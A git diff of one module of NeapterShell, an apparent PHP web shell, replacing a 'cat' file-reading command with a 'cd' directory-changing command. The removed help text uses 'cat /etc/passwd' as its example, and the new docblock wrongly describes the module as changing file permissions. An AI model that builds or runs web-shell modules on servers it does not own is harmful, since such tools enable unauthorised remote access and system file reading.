@@ -10,7 +10,7 @@
  */
 
 /**
- * Wyswietlanie zawartosci pliku
+ * Zmienianie uprawnien dla pliku
  *
  * @author    Krzysztof Otręba <krzotr@gmail.com>
  * @copyright Copyright (c) 2012, Krzysztof Otręba
@@ -18,7 +18,7 @@
  * @package    NeapterShell
  * @subpackage Modules
  */
-class ModuleCat extends ModuleAbstract
+class ModuleCd extends ModuleAbstract
 {
     /**
      * Dostepna lista komend
@@ -28,7 +28,7 @@ class ModuleCat extends ModuleAbstract
      */
     public static function getCommands()
     {
-        return array('cat');
+        return array('cd');
     }
 
     /**
@@ -42,7 +42,7 @@ class ModuleCat extends ModuleAbstract
         /**
          * Wersja Data Autor
          */
-        return '1.01 2011-06-23 - <krzotr@gmail.com>';
+        return '1.0.0 2016-02-26 - <krzotr@gmail.com>';
     }
 
     /**
@@ -54,13 +54,13 @@ class ModuleCat extends ModuleAbstract
     public static function getHelp()
     {
         return <<<DATA
-Wyświetlanie zawartości pliku
+Zmiana aktualnego katalogu
 
-	Użycie:
-		cat ścieżka_do_pliku
+    Użycie:
+        cd sciezka
 
-	Przykład:
-		cat /etc/passwd
+    Przykład:
+        cd /tmp
 DATA;
     }
 
@@ -72,23 +72,15 @@ DATA;
      */
     public function get()
     {
-        /**
-         * Help
-         */
-        if ($this->oArgs->getNumberOfParams() !== 1) {
-            return self::getHelp();
+        $sDir = $this->oArgs->getParam(0);
+
+        if (@chdir($sDir)) {
+            $this->oUtils->cacheSet('chdir', $sDir);
+
+            return sprintf("Katalog zmieniono na:\r\n    %s", getcwd());
         }
 
-        $sFilePath = $this->oArgs->getParam(0);
-
-        /**
-         * Plik zrodlowy musi istniec
-         */
-        if (!is_file($sFilePath)) {
-            return sprintf('Plik "%s" nie istnieje', $sFilePath);
-        }
-
-        return htmlspecialchars(file_get_contents($sFilePath));
+        return 'Nie udało się zmienić katalogu!!!';
     }
 
 }
